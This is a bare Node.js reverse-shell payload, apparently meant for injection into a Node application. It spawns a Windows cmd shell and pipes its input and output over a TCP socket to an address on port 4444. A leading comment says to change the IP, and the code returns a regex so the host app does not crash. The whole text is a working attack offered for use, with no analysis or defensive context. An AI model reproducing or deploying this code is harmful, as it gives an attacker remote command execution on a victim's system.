// Change Ip from line 7
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("cmd", []);
    var client = new net.Socket();
    client.connect(4444, "172.0.0.1", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application from crashing
})();